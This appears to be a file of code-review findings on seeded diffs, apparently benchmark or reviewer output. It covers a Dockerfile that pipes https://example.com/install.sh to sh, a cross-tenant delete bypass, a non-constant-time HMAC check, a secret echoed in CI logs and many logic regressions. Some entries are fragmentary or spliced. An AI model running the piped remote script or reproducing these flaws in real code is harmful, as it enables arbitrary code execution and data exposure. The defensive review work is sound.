findings.title: Remote script piped to sh at build time with no integrity verification
findings.whyItBreaks: RUN curl -sL https://example.com/install.sh | sh executes whatever the remote server serves at image-build time, as root, with no pinned version, checksum/signature verification, or allow-list. Compromise of example.com (or any MITM/redirect target) yields arbitrary code execution in the image build, and a changed server-side payload silently changes the built image's contents. The build is non-reproducible and its provenance is unverifiable.

findings.title: curl failure is silently masked by the pipe and -sL
findings.whyItBreaks: curl -sL pipes the body to sh regardless of HTTP status (missing -f/--fail) and hides error output (-s). A 404/500/timeout still pipes (empty or error-page) content to sh; the pipeline's exit status is sh's, not curl's, so a failed download can yield a misleadingly 'successful' build with a silently missing install.

findings.title: Unpinned remote script executed via curl|sh at build time
findings.whyItBreaks: RUN curl -sL https://example.com/install.sh | sh downloads and executes a remote script with no version pin, no checksum/signature verification, and no HTTPS-pinned host control at image-build time. Anyone controlling (or whoever resolves) that URL controls the image build; the build also gains an unverifiable network egress dependency and is no longer reproducible. The host is a placeholder domain, so this line is not a legitimate, reviewable dependency.

findings.title: Curl fetch failure is silently swallowed; build succeeds with nothing installed
findings.whyItBreaks: curl is invoked with -s (silent, no --fail/--show-error) and its result is piped to sh; the pipeline's exit status is sh's, not curl's. On DNS/connection/TLS failure or an HTTP error, curl produces empty output (or an error page) with a success-shaped pipe, sh on empty input exits 0, and the RUN step passes — the image builds and ships with the install step silently missing.

findings.title: Build executes unpinned remote script via curl|sh
findings.whyItBreaks: The added line pipes the output of https://example.com/install.sh directly into sh at image build time. Anyone who controls (or who can MITM/redirect) that URL, or who changes the script between builds, runs arbitrary code inside the build with the build's privileges and network access. There is no checksum, signature, version pin, or allowlist, so the image is non-reproducible and trust is delegated to an unverified remote host (and the placeholder example.com URL is also not a real install source, so the build is not reproducible or reliably functional either).

findings.title: LoadOrDefault discards ErrMissing, conflating failure with empty value
findings.whyItBreaks: Load returns ("", ErrMissing) when the key is absent and ("", nil) when the key is present with an empty value. LoadOrDefault does `v, _ := Load(key, m)` and returns v, so the error signal is discarded. A caller cannot distinguish 'key missing' (a failure/default case) from 'key present with empty string' (a legitimate stored value), and cannot tell why the result was empty. The function name promises a 'default', but it bakes in a single hard-coded "" with no caller-chosen default parameter, so the only value it can return is indistinguishable from success-with-empty. Each line is locally correct; the contract is broken.

findings.title: LoadOrDefault discards Load's error, conflating missing key with a stored empty value
findings.whyItBreaks: Load returns ("", ErrMissing) for a missing key and ("", nil) for a key present with an empty-string value. The new wrapper does `v, _ := Load(key, m); return v`, so every caller receives "" in both cases (and any future non-ErrMissing error from Load would also be silently dropped). Callers cannot distinguish "unset" from "stored empty string", and failure-as-value is indistinguishable from legitimate data. The swallow site is exported (capital Load), so this is a present API contract defect, not a speculative one; there are currently no in-repo callers, which does not clear it.

findings.title: Run returns before work completes; results ordering and completion are lost
findings.whyItBreaks: Base version sent j*2 to results synchronously and only returned after every job's send completed (and in order). New version spawns a goroutine per job and returns immediately; Run no longer waits for or reflects completion. Callers that relied on Run's return meaning 'all results sent' (e.g. to close the results channel or read results) will now close the channel while goroutines are still sending -> send-on-closed-channel panic; with an unbuffered results channel and no consumer, base would block in Run, new code returns instantly and leaks N goroutines. Results arrive in nondeterministic order instead of input order.

findings.title: Run returns before any result is delivered
findings.whyItBreaks: Previously Run blocked until every job's result had been sent to `results` (synchronous send inside the loop). Now it spawns goroutines and returns before any send happens. Any caller that waits on Run returning as the signal that all results are produced (or that closes `results` after Run returns, e.g. `Run(ctx, jobs, ch); close(ch)`) will now close the channel while goroutines are still sending → send-on-closed-channel panic, or read a truncated stream. There is also no synchronization/WaitGroup or ctx-driven cancellation, so the caller cannot observe completion at all.

findings.title: Unbounded goroutine-per-job with no cancellation
findings.whyItBreaks: Each job spawns a new goroutine that blocks on `results <- j * 2`. If the consumer stops reading (early exit, error, ctx cancel), every goroutine leaks and remains blocked on the channel forever; ctx is never checked inside the goroutine. For a large jobs slice this is an unbounded number of goroutines and uncontrolled goroutine blow-up/memory pressure.

findings.title: Run returns before jobs finish; completion/ordering contract broken
findings.whyItBreaks: Base blocked on every send, so Run returned only after all results were delivered. Head spawns an unbounded goroutine per job and returns immediately: (a) results arrive in nondeterministic order instead of input order; (b) goroutines block forever on results <- j*2 if the receiver stops reading, leaking a goroutine per job; (c) the canonical caller pattern `Run(ctx, jobs, ch); close(ch)` now panics with 'send on closed channel'; (d) callers that require Run to mean 'all jobs processed' (e.g. before teardown or closing the channel) silently race with the background sends. ctx is still unused, but that is pre-existing.

findings.title: Exported Log accepts tag that is silently discarded
findings.whyItBreaks: The signature now promises tagging (`tag ...string`), but the body only prints `message`; any caller passing a tag gets it silently dropped from the output with no error, so log tagging/filtering callers cannot trust the API contract. Not blocking because no in-repo caller passes tags and Go compiles regardless.

findings.title: Variadic tag parameter silently ignored
findings.whyItBreaks: `Log(message string, tag ...string)` accepts tags, but the body only does `println(message)` — any tag a caller passes is discarded with no error and no visible output, so the new parameter is dead and any caller relying on tagged output gets untagged output.

findings.title: canDeleteRecord now allows cross-tenant and non-admin deletes
findings.whyItBreaks: Before: admin AND same-tenant. After: admin OR same-tenant. Two regressions: (1) an admin session for tenant A now passes canDeleteRecord for a record in tenant B (session.isAdmin short-circuits the tenant check), allowing cross-tenant record deletion; (2) a non-admin session for tenant A now passes for ANY record in tenant A, not only ones it controls (session.tenantId === record.tenantId short-circuits the isAdmin requirement), so non-admin users can delete any record in their tenant. RecordRef.ownerId is still never checked, so same-tenant non-admin deletion reaches records owned by other users.

findings.title: canDeleteRecord now allows cross-tenant deletes by any admin
findings.whyItBreaks: Change replaces `session.isAdmin && session.tenantId === record.tenantId` with `session.isAdmin || session.tenantId === record.tenantId`. Any admin (even from tenant A) now satisfies the predicate for records in tenant B, bypassing tenant-isolation on delete. Same-tenant non-admins are also now permitted (previously only tenant admins). The function is exported with no in-repo callers, but it is the public authorization gate; the new semantics break the tenant-isolation contract.

findings.title: canDeleteRecord widened: cross-tenant admin and any same-tenant user can delete
findings.whyItBreaks: The old guard `session.isAdmin && session.tenantId === record.tenantId` required the caller to be an admin AND in the record's tenant. The new `||` makes deletion pass for (a) any admin regardless of record tenant (cross-tenant deletion by an admin of tenant A against a record in tenant B), and (b) any non-admin whose tenant matches (previously denied). Both are tenant-isolation and role-enforcement bypasses on a destructive operation.

findings.title: catch-all silently turns invalid settings into defaults
findings.whyItBreaks: Before this diff, a syntax-error raw string or a well-formed object with a non-string theme / non-number fontSize threw, propagating the failure to the caller of parseSettings (e.g. updateFontSize, src/settings.ts:20). Now every failure — malformed JSON, the explicit 'bad theme'/'bad fontSize' throws at lines 11-12, and JSON.parse errors — is caught and replaced with { theme: 'light', fontSize: 14 }. updateFontSize then overwrites fontSize and save() writes the reset object, silently discarding whatever the stored settings were (real theme/fontSize are lost, not reported). No caller can distinguish 'failed to parse' from 'settings are actually defaults'.

findings.title: parseSettings swallows failure; updateFontSize overwrites user settings with defaults
findings.whyItBreaks: Previously a corrupt/partial raw string caused parseSettings to throw, so updateFontSize never reached save() and the persisted file was left intact. Now the catch returns {...DEFAULTS} and updateFontSize proceeds to settings.fontSize = size and save(JSON.stringify(settings)), overwriting the user's file with theme:"light" plus the new fontSize — silently discarding the user's theme (and any other valid-but-unusable fields). The invalid-input error signal is discarded at the catch site and the failure is indistinguishable from a legitimate default-ish value. This also affects partially-valid input like {"theme":"dark"} (missing fontSize): previously an error; now the valid theme is dropped and defaults + new fontSize are persisted.

findings.title: parseSettings swallows errors and silently returns DEFAULTS
findings.whyItBreaks: Before this diff, parseSettings threw on invalid JSON and on non-string theme / non-number fontSize, so failures propagated to callers (including updateFontSize, which would abort before save()). The new try/catch returns { ...DEFAULTS } on ANY failure — including JSON.parse throwing, null/non-object JSON, and the explicit 'bad theme'/'bad fontSize' throws — making corrupt input indistinguishable from a valid default configuration. Worse, updateFontSize (line 19-23) then sets fontSize and calls save(), so a corrupted raw settings string is silently overwritten with { theme: "light", fontSize: size }, discarding whatever the user had configured. The previously useful error signals ('bad theme', 'bad fontSize', SyntaxError) are discarded with no logging.

findings.title: artifactsAt uses "verified" ref, not the builtFrom commit
findings.whyItBreaks: The change decouples provenance: builtFrom reports build.ref(branch), but artifacts are now fetched from build.ref("verified"). The report therefore claims artifacts built from the branch commit while listing whatever commit "verified" points at — which may be a different commit (or a missing ref; Build#ref returns a string with no failure signal, so a nonexistent "verified" ref cannot be distinguished from a real one). Any consumer trusting the report (release gating, artifact attestation) reads artifacts from an unverified provenance path. Previously artifactsAt(commit) and builtFrom were the same commit; that invariant is now silently broken.

findings.title: buildReport resolves artifacts from literal "verified" ref
findings.whyItBreaks: The function computes commit = build.ref(branch) for builtFrom but passes build.ref("verified") to artifactsAt(), so the report mixes two unrelated refs: builtFrom reports the branch commit while artifacts are whatever commit the "verified" ref points at (possibly a different commit, or an undefined/missing ref depending on Build implementation). The caller can no longer trust artifacts to belong to the reported build.

findings.title: Artifacts fetched from wrong ref, mismatch with builtFrom
findings.whyItBreaks: buildReport reports builtFrom = build.ref(branch) but artifacts = build.artifactsAt(build.ref("verified")). The report is internally inconsistent: it claims a build from the branch commit while shipping artifacts from an arbitrary "verified" ref. If "verified" does not exist or points elsewhere, the artifacts listed are not the ones the report claims; any consumer trusting artifacts to correspond to builtFrom gets wrong data. Previously artifacts came from the same commit as builtFrom.

findings.title: recentEntries ignores `limit` for limit>0
findings.whyItBreaks: The doc comment promises at most `limit` entries, newest first, but the body returns the full reversed array whenever limit > 0 (the slice was removed, replaced with a bare `return sorted;`). The only caller renderFeed (src/feed.ts:9) relies on the cap: it allocates `new Array(20)` and expects a page of at most 20; with this change the loop at src/feed.ts:11-13 writes out[i] for every entry in `all`, growing the result past 20 entries with no truncation — the 'newest first, at most 20' contract is broken for any input longer than 20.

findings.title: recentEntries ignores limit and returns all entries
findings.whyItBreaks: The diff removes `.slice(0, limit)` and returns `sorted` unconditionally (for any limit > 0). The doc comment promises "at most `limit` entries". The only caller, renderFeed (src/feed.ts:9), passes limit=20 and then fills a fixed 20-slot output array; with >20 input entries, page.length exceeds 20, the loop extends `out` beyond its declared length (out[20..n] assigned, so the returned array grows past 20 elements), so renderFeed no longer emits at most 20 newest entries — it emits the entire input in reversed order. This also breaks the documented contract for any external caller relying on the slice.

findings.title: recentEntries ignores limit; returns all entries
findings.whyItBreaks: The diff replaces `return [...all].reverse().slice(0, limit)` with `return sorted` (keeping only the limit<=0 guard). For any positive limit the function returns every entry, newest first, contradicting its doc comment ("Returns at most `limit` entries") and breaking renderFeed's assumption that at most 20 items come back: with >20 entries, renderFeed's fixed `new Array(20)` is indexed past 19 (page.length can exceed 20), growing the returned array beyond 20 and producing an unfiltered/overflowing feed. The limit<=0 guard correctly returns [] but the normal path regresses.

Any consumer that parses the header and compares it to the number of data rows (a standard integrity check for a generated manifest) rejects or miscounts the manifest whenever any entry is stale. Before this diff, count and rows were the same length; after, they diverge whenever stale entries exist.

findings.title: Header entry-count includes stale entries dropped from rows
findings.whyItBreaks: The diff filters stale entries out of the emitted rows (line 20-21) but still passes entries.length to headerLines on line 22, so the emitted '# entry-count: N' disagrees with the number of data rows in the same manifest whenever any entry is stale. When pinnedTag resolves to a different revision than "latest" (the entire point of a pinned tag), the path list is measured against the wrong base: paths changed between latest and now are reported as if relative to the pinned revision (or an empty/stale list when latest is ahead of the pin), and a consumer replaying changedPaths on top of fromRevision applies paths relative to a base they were never computed from. findings.title: Async reserve() admits oversell race across concurrent callers
findings.whyItBreaks: reserve() reads `this.stock.get(sku)`, then awaits `store.save(...)`, then sets `this.stock`. Two concurrent reserve() calls for the same sku (both when remaining=1) both read 1, both await save(sku, 0), both then set stock to 0 and both return true — two reservations granted for one unit, with save() called twice (last-write-wins) and stock permanently 0. Previously reserve() was synchronous: the read/check/set happened in one uninterrupted turn, so no interleaving was possible. The fix must make the read-check-decrement atomic (e.g. decrement in-memory under one synchronous block before/after the save, or serialize via a per-sku mutex/queue) rather than dropping the await in the middle of the critical section.

findings.title: Race in async reserve oversells stock under concurrency

With remaining=1, two concurrent reserve(sku) calls both read 1, both await save(sku, 0), both set stock to 0, and both return true — two reservations granted for one unit. The pre-change synchronous body had no await, so the read-check-write was atomic. The fix is to reserve from the in-memory value synchronously (or serialize per-sku) before/around the async persist, e.g. decrement/check first, then save and roll back on failure.

Before this diff, reserve was synchronous so the read-check-decrement was atomic; the async change converts a single-threaded-safe operation into a non-atomic one with no lock/queue. findings.title: retry.ts still multiplies by 1000 after backoff() switched to milliseconds

findings.title: Save silently discards file close error on success

The write-error and flush-error paths already discarded close errors in the base, so the net regression is specifically the success path. Save is exported (store.Save), so every eventual caller is forced to treat success as 'file durably written' when the close error is invisible.

findings.title: Success path swallows os.File.Close error

A caller that trusts a nil error to mean the file is durably written can now report success on a save whose close failed. This is an exported API (store.Save) whose error contract changed silently.

The cache is functionally broken in both directions.

findings.title: pruneDone mutates input and skips elements after splice
findings.whyItBreaks: splice(index,1) inside forEach: after removal, the tail shifts down but forEach keeps incrementing index, so the element shifted into index is skipped — e.g. [done, done, not-done] becomes [done, not-done] (first done removed, second done remains). Additionally the old filter-based version returned a new array leaving the caller's array untouched; the new version mutates the caller's array in place and returns it, changing the contract (callers holding the original reference see their array silently shrink — a lost/dropped write for any pending-job consumer).

findings.title: TTL comparison inverted in TtlCache.get
findings.whyItBreaks: The guard was flipped from '<' to '>'. A fresh entry (Date.now() - storedAt < ttlMs) now falls through, gets deleted, and returns null, while an expired entry (> ttlMs) is returned as a cache hit and kept. Net effect: stale values are served and valid fresh entries are dropped — the cache is useless/harmful.

findings.title: pruneDone splices during forEach and skips entries
findings.whyItBreaks: jobs.forEach iterates by index while jobs.splice(index, 1) shrinks the array mid-iteration. For a run of consecutive done jobs (e.g. [{done:true},{done:true}]), the first splice removes index 0, shifting the next element into index 0, but forEach continues at index 1 which no longer exists — so the second done job is never visited and remains in the returned array. It also mutates the caller's array in place and returns the same reference instead of a fresh filtered array, changing the function's contract.

findings.title: busiest sorts caller's array in place
findings.whyItBreaks: The guard `[...rows].sort(...)` was replaced with `rows.sort(...)`, so busiest() now mutates the caller's array (reorders it in place). Since it is an exported public helper, any caller holding the array gets a silently reordered list, and `[0] ?? null` semantics are unaffected for empty input but caller state is corrupted.

findings.title: averageAmount returns NaN for empty rows
findings.whyItBreaks: The `if (rows.length === 0) return 0;` guard was removed, so `total / rows.length` computes 0/0 = NaN for an empty array, silently changing the documented/defaulted return from 0 to NaN for a public exported function.

findings.title: averageAmount returns NaN on empty rows
findings.whyItBreaks: The empty-array guard was deleted; reduce on [] yields 0 and 0/0 = NaN, whereas the base version explicitly returned 0. The exported function now yields a non-numeric-looking sentinel the caller cannot distinguish from a real average, and no in-repo validation/test guards it.

findings.title: busiest sorts caller's array in place
findings.whyItBreaks: `rows.sort(...)` mutates the caller's array (previously `[...rows].sort(...)` copied it). Any caller relying on row order, or reusing the array after the call, sees it reordered as a side effect.

findings.title: averageAmount returns NaN for empty rows
findings.whyItBreaks: The `if (rows.length === 0) return 0;` guard was removed. For an empty array, `total` is 0 and `0 / 0` yields NaN, so every caller that legitimately passes an empty list (previously returning 0) now receives NaN, which propagates into downstream arithmetic and reports.

findings.title: busiest sorts the caller's array in place
findings.whyItBreaks: `rows.sort(...)` sorts the caller's array by reference instead of the previous `[...rows].sort(...)` copy. Any caller that passes an array it still needs in its original order (e.g., displays rows chronologically after finding the busiest) gets its data silently reordered, a side effect and ordering regression that callers cannot distinguish from intentional sorting.

findings.title: rankScores sorts numbers lexicographically, breaking cutoff and selection
findings.whyItBreaks: scores.sort() without a comparator coerces scores to strings and compares lexicographically; scores.reverse() then only flips that lexicographic order. E.g. scores [9, 10] sort to ["10","9"], reverse to ["9","10"]; for n=2 the cutoff is scores[1] = "10" (a string at runtime, typed as number), so the filter p.score >= cutoff (p.score >= "10" coerces) drops the 9, and the top-2 result misses it. Similarly [9, 100, 10] yields cutoff "100" and excludes 10. The base code used scores.sort((a, b) => b - a) and produced correct numeric cutoffs. topPlayers and formatBoard both consume this, so the whole board ranks/selects incorrectly.

findings.title: rankScores sorts numbers lexicographically
findings.whyItBreaks: scores.sort() without a comparator sorts by string serialization, not numeric value, so [100, 9, 10] sorts to [10, 100, 9] and reverse() yields [9, 100, 10]. The cutoff in topPlayers (scores[min(n, len) - 1]) is therefore a non-numeric, wrong threshold; e.g. with n=1 the cutoff becomes 9 instead of 100, so players.filter(p => p.score >= cutoff) keeps far more players (or the wrong ones) and slice(0, n) then returns the wrong players in the wrong order. formatBoard (line 19-23) consumes topPlayers and renders a wrong leaderboard.

findings.title: rankScores sorts lexicographically, breaking numeric top-n
findings.whyItBreaks: scores.sort() without a comparator sorts by string conversion ("10" < "9"), and .reverse() only reverses that string order — it does not restore numeric descending order. For players [{score:9},{score:100},{score:2}], rankScores returns [9,2,100] (verified via node); topPlayers(players,1) then computes cutoff=9 and selects a score-9 player as #1 even though 100 is higher. For n > players.length, cutoff is the lexicographically-smallest string (e.g. 100 for [9,100,2]), which filters out legitimate scores (e.g. 9) that should all pass. The base code sorted numerically with (a,b)=>b-a, which was correct.

findings.title: Webhook signature compared with == instead of hmac.compare_digest
findings.whyItBreaks: The base implementation used hmac.compare_digest(expected, given_signature), which is constant-time. The changed code uses `==`, which short-circuits on the first differing byte, leaking how much of the presented signature matches the expected HMAC. An attacker can probe byte-by-byte and recover the expected hexdigest (or forge signatures) over many requests, which defeats the webhook authentication that handle() relies on before calling processor(payload).

findings.title: Signature comparison no longer constant-time
findings.whyItBreaks: verify() now uses `signature_of(payload, secret) == given_signature`. Plain str.__eq__ short-circuits on the first differing byte, so the comparison time leaks how many leading bytes of the expected HMAC hex digest match the attacker-supplied signature. This is exactly the class of attack hmac.compare_digest exists to prevent on an HMAC verification path; the base version used it correctly. An attacker can iterate signature bytes over the wire and recover the expected digest, defeating the webhook's authentication.

findings.title: Timing-attack: signature check no longer constant-time
findings.whyItBreaks: The base used hmac.compare_digest(expected, given_signature), which compares in constant time. The change makes verify() return signature_of(payload, secret) == given_signature, i.e. a short-circuiting string equality. An attacker who can measure response/timing can recover the expected hex digest byte-by-byte by probing signatures, defeating the webhook's authenticity guarantee and letting forged payloads reach processor().

findings.title: Balance updates escape the transaction
findings.whyItBreaks: In the base, the ledger INSERT and both balance UPDATEs ran inside one `db.transaction()`. After the change, only `_record_ledger` is inside the transaction (lines 21-22); `_apply_balances` (lines 23-24) runs outside it. If the debit or credit UPDATE raises (e.g. insufficient funds check, account-not-found, DB error), the ledger row for the transfer is still committed while the balances are unchanged — the ledger reports a transfer that never happened. Additionally the two balance UPDATEs are no longer atomic with each other, so a failure between the debit and credit leaves one side updated and the other not. `transfer` still returns {"ok": True} in the success path with no guard, and the earlier ValueError path is unaffected.

findings.title: Balance updates moved out of the transaction
findings.whyItBreaks: Base wrapped the ledger INSERT and both balance UPDATEs in a single `with db.transaction():`, so a failure in either balance update rolled back the ledger entry too. The head version only wraps `_record_ledger`; `_apply_balances` runs outside the transaction. If the second (or first) balance update fails, the ledger row is already committed while balances are unchanged (or only partially updated, e.g. from_acct debited but to_acct not credited), leaving the ledger and balances permanently inconsistent with no rollback.

findings.title: Balance updates moved outside the transaction
findings.whyItBreaks: Previously the ledger insert, debit and credit all ran inside `with db.transaction()`. The change wraps only `_record_ledger(...)` in the transaction and calls `_apply_balances(...)` after it exits. If `_apply_balances` raises (or the process dies), the ledger row is already committed while balances were not updated (or partially updated — the debit at app/transfer.py:8-10 commits before the credit at :11-14 runs). The caller still sees a raised error but the ledger now records a transfer that never fully settled; retrying double-records the ledger entry and re-debits. A crash between the two balance writes leaves the money debited from the source but not credited to the destination.

findings.title: billingDay switched from UTC to local time
findings.whyItBreaks: The base contract used getUTCFullYear/getUTCMonth/getUTCDate, so a billing instant mapped to a single canonical day regardless of where the process ran. The change uses getFullYear/getMonth/getDate, so the same Date (e.g. 2025-01-01T00:30:00Z, or any instant near midnight) resolves to a different billing day depending on the host timezone. sameBillingDay() (line 8) inherits this, so two instants that are genuinely the same UTC day can be split across billing days (or vice versa) on non-UTC hosts, or compute differently across deploys in different zones. No caller in the repo compensates, and there is no doc/test pinning local time as intended.

findings.title: billingDay now depends on host timezone instead of UTC
findings.whyItBreaks: The base implementation used getUTCFullYear/getUTCMonth/getUTCDate, pinning the billing day to an absolute instant. The change switches to getFullYear/getMonth/getDate, which interpret the timestamp in the server/process timezone. The same Date therefore classifies to different calendar days depending on the host: e.g. 2026-01-01T00:30:00Z is 2025-12-31 in America/New_York but 2026-01-01 in Europe/Berlin / Asia/Tokyo. Across dev/CI/production hosts (and across migration or multi-region servers), billing days and sameBillingDay(a, b) comparisons will disagree for the same instants, producing mis-billed day boundaries and inconsistent same/different-day results. sameBillingDay (lines 7-9) inherits this, so toggling a timezone can flip the result of same-day comparisons for the exact same two instants.

findings.title: billingDay switched from UTC to local timezone, making day attribution host-dependent
findings.whyItBreaks: The old code read getUTCFullYear/getUTCMonth/getUTCDate; the new code reads getFullYear/getMonth/getDate. For the same instant (e.g. 2024-01-01T00:30:00Z), the returned day differs by host timezone (e.g. 2023-12-31 under UTC-8 vs 2024-01-01 under UTC+14), so billing-period grouping is non-deterministic across machines, and sameBillingDay inherits the instability. The semantic flip lands without any test or documenting why billing days are now local-time rather than UTC.

findings.title: Memo cache key drops tenant, cross-tenant profile collision
findings.whyItBreaks: readProfile(tenant, account, fetchProfile) is tenant-scoped by signature (fetchProfile takes tenant and account). With key=account, a profile fetched for tenant A/account X stored in memo is returned to a later call for tenant B/account X — the returned Profile carries tenant A's tenant and displayName, not tenant B's. Cross-tenant wrong-data serving on an always-live exported path, and there are no callers/tests to mask it (rg finds no other callers of readProfile; no test files exist).

findings.title: Memo key drops tenant, leaking profiles across tenants
findings.whyItBreaks: The key changed from `${tenant}:${account}` to `account`. Any two tenants with the same account string now share a cache entry: the second caller gets the first tenant's cached Profile (including its `tenant` field and displayName) without calling fetchProfile. Previously each (tenant, account) pair was cached independently; now a same-account account in tenant B is served tenant A's data. The cache is module-level and never invalidated, so the wrong-tenant result persists for process lifetime.

findings.title: memo key lost tenant scope — cross-tenant profile collision
findings.whyItBreaks: readProfile now keys the module-level memo on `account` only (was `${tenant}:${account}`). The same account name in two tenants maps to one cache entry; after tenant A fetches, a request for tenant B with the same account key (`memo.get(key)` hits, line 15-16) returns tenant A's profile — including A's tenant field and displayName — without ever calling fetchProfile for that tenant. That leaks tenant A's profile data into tenant B's request and bypasses the tenant-scoped fetch contract that fetchProfile requires.

findings.title: load() swallows missing-key errors and returns empty string
findings.whyItBreaks: Previously load() threw `missing: <key>` when the key was absent, giving callers a hard, distinguishable signal. The new try/catch converts that throw into a silent "" return, also conflating a legitimately stored empty string with a missing key, and swallowing any error thrown by store.get itself (the whole body is inside try). loadAll() (src/store.ts:11-14) propagates load()'s behavior, so a batch of keys now degrades to ["", ...] instead of failing fast on the first missing key — callers cannot distinguish 'key absent' from 'stored empty value' and may persist/bill/report the fallback as real. The exported signature is unchanged, so any existing or future caller relying on the throw-on-miss contract silently breaks.

findings.title: load() swallows missing-key/lookup failure into empty string
findings.whyItBreaks: Before this diff, load(key, store) threw Error(`missing: ${key}`) when the key was absent, so a caller could distinguish 'not present' from a stored value. Now the try/catch wraps the whole body, so the thrown missing-key error is caught and converted to return "" — and so is ANY unexpected error from store.get itself. In-repo, loadAll (src/store.ts:11-13) maps load over keys and now returns "" for missing keys instead of throwing, so a batch caller silently sees empty strings where it used to fail loudly. Worse, "" is also the value a store legitimately holds for an empty stored value, so callers can no longer branch on 'missing' vs 'present-empty'. This is an exported public function: every future caller is forced to conflate failure with a real value.

findings.title: load() discards missing-key error and returns empty string
findings.whyItBreaks: Previously, load(key, store) threw `missing: <key>` when the key was absent. The new try/catch catches that deliberate throw (and any unexpected error from store.get) and returns "". Callers can no longer distinguish a missing key from a legitimately stored empty string, and any error other than the missing-key case is silently discarded instead of propagating. loadAll(keys, store) at src/store.ts:11-13, which maps over load, now silently reports missing keys as empty strings instead of failing. The exported function is a public contract; no in-repo callers exist, but the swallow itself is the defect and every eventual caller is forced to conflate failure with a real value.

findings.title: Breaking Config rename loses the unit and breaks existing callers
findings.whyItBreaks: TimeoutMs was renamed to timeout with no alias and no stated unit (the body still adds it to Date.now() in ms at line 8/21). Typed consumers passing the old shape fail loudly, but untyped/transpile-only callers get config.timeout === undefined -> deadline = NaN -> the Date.now() > deadline check is never true -> retry runs all attempts with no effective timeout instead of stopping at the deadline. The new required field retries (line 3) is also forced onto every caller of retry, which ignores it, and maxAttempts is now required by retryBackground (line 22), which ignores it — callers must fabricate a meaningless value for an unused knob. Worse, retryBackground reads config.retries as the total attempt count ('i < config.retries'), which is the same semantics as maxAttempts used by retry — so 'retries' reads as a distinct knob while behaving identically.

findings.title: retryBackground duplicates retry and promises background behavior it never delivers
findings.whyItBreaks: The function is an exact copy of retry (same deadline computation, same loop, same try/catch-continue) with only the loop bound swapped to config.retries — duplicate public behavior and no new capability. The name promises background/non-blocking execution, but the body is a synchronous void loop that blocks the caller's stack until an attempt succeeds or retries exhausts; nothing is deferred, workered, or detached. A caller relying on the name (e.g. firing it and continuing, or offloading a slow fn) will block and, worse, when untyped config arrives the loop terminates instantly with fn never called.

findings.title: Breaking timeoutMs→timeout rename; old-shape callers silently misbehave
findings.whyItBreaks: Config.timeoutMs was renamed to timeout and the interface now requires both maxAttempts AND retries. Any existing caller passing the old shape { maxAttempts, timeoutMs }: retry() computes deadline = Date.now() + undefined = NaN, so `Date.now() > deadline` is always false and the timeout is never enforced (loop runs the full maxAttempts regardless of deadline); retryBackground() compares `i < undefined`, which is always false, so it never calls fn() at all — a silent no-op. No alias, migration, or guard for the old field. No in-repo call sites exist to catch this.

findings.title: retryBackground duplicates retry; Config carries two redundant attempt knobs
findings.whyItBreaks: retryBackground's body is line-identical to retry except the loop bound reads config.retries instead of config.maxAttempts (retry() ignores retries entirely; retryBackground ignores maxAttempts entirely). Config now requires BOTH fields although each function reads only one, so callers must supply an irrelevant value on every call and the two knobs can drift apart (e.g. retries=10 with maxAttempts=0) leaving one path silently not running.

findings.title: New public retryBackground swallows all errors with no signal
findings.whyItBreaks: The new exported function discards every failure signal: the catch-all (lines 27-29) continues with no logging, error object, or return, and the return value (or even a boolean success flag) is always void. Every eventual caller is forced to conflate repeated failure with success and cannot distinguish 'fn succeeded', 'fn failed all attempts', or 'fn never ran' (e.g. deadline/zero-attempt paths). The sibling retry() has the same pre-existing pattern, but this diff ships a second public contract with the same opacity; background behavior of 'fire-and-forget' does not justify a void-only contract with no observable outcome.

findings.title: Config requires dead required field `retries` on the retry path
findings.whyItBreaks: `retries` is now a required member of Config (line 3) but is never read by `retry` (line 9 reads only `maxAttempts`, line 8 reads only `timeout`). Every pre-existing/new `retry` caller is forced to supply a meaningless `retries` value, and `retryBackground` likewise requires `maxAttempts`, which it never reads. The two functions want different knobs but share one over-constrained Config, pushing dead values into otherwise-valid call sites.

findings.title: Field renders label instead of value
findings.whyItBreaks: The component's public contract (Field receives a value and displays it) is broken: defaultValue is now `len=${value.length}`, so the input shows e.g. 'len=5' instead of 'hello'. Any caller passing a string sees the length label rather than its content. Repo has no current callers (rg found none), so this ships as an unusable public component contract.

findings.title: number value: value.length is undefined
findings.whyItBreaks: value is typed string | number, but .length exists only on strings; for a number input (a newly allowed type) the template literal evaluates to 'len=undefined', so the displayed value is silently wrong. Silent data/display corruption, not a crash.

findings.title: Field renders 'len=N' instead of the value
findings.whyItBreaks: The component's only purpose is to show `value` in the input. The change makes `defaultValue` a computed string `len=${value.length}`, so a caller passing 'hello' gets an input pre-filled with 'len=5' — the actual value is never displayed. Previously `<input defaultValue={value} />` rendered the value faithfully.

findings.title: `value.length` is invalid on number input
findings.whyItBreaks: The type was widened to `string | number` but the body does `value.length`. Numbers have no `.length`, so a numeric value renders `len=undefined` (e.g. value=42 -> 'len=undefined'). TypeScript would also reject the union access: Property 'length' does not exist on type 'string | number'.

findings.title: Field renders length label instead of value
findings.whyItBreaks: The component previously displayed the caller-provided `value` in the <input>; it now displays `len=${value.length}`, so the user sees e.g. "len=5" instead of the real content. Since defaultValue is the only rendered output (no re-render of value), every string caller gets a corrupted display.

findings.title: Numeric value renders len=undefined
findings.whyItBreaks: The interface now accepts `string | number`, but Number has no `.length` property, so `value.length` is `undefined` and the label renders "len=undefined" for every numeric caller. The widened type promises a case the body does not handle.

findings.title: Workflow rename changes external check identity
findings.whyItBreaks: The workflow 'name' is GitHub's public identity for the workflow: required status checks and any workflow_run triggers keyed on the previous name 'deploy' will silently stop matching after this rename (and merges that required the 'deploy' check will be blocked or the gate silently removed). No in-repo reference to 'deploy' exists to catch this (verified via rg: only this file matches). The rename is the cause; the external settings are outside the repo and cannot be verified here.

findings.title: Echoing secret token to workflow log
findings.whyItBreaks: The new step passes secrets.TOKEN via step-level env and prints it with `run: echo "deploying with $TOKEN"`. Anyone with read access to the workflow log sees the step output; GitHub masks the exact secret value in logs, but echoing a credential to a log is an exposed-secret anti-pattern and can leak when the value changes format (prefixes, derived tokens, or secrets not registered for masking) or via any log-retrieval/debugging path. It also runs on every push before build with no gating or justification.

findings.title: Secret echoed into CI log
findings.whyItBreaks: The new step injects secrets.TOKEN into the job environment and immediately echoes it to the run log ('deploying with $TOKEN'). Workflow logs are readable by anyone with read access to the repo and the exact string is only masked by GitHub's best-effort log redaction; any value that does not match the registered secret byte-for-byte (or a future log-shipping/external capture of the log) exposes the credential. The step also performs no actual deploy — it is dead code whose only effect is to print secret material.

findings.title: git helper drops 64MB maxBuffer, large diffs now crash
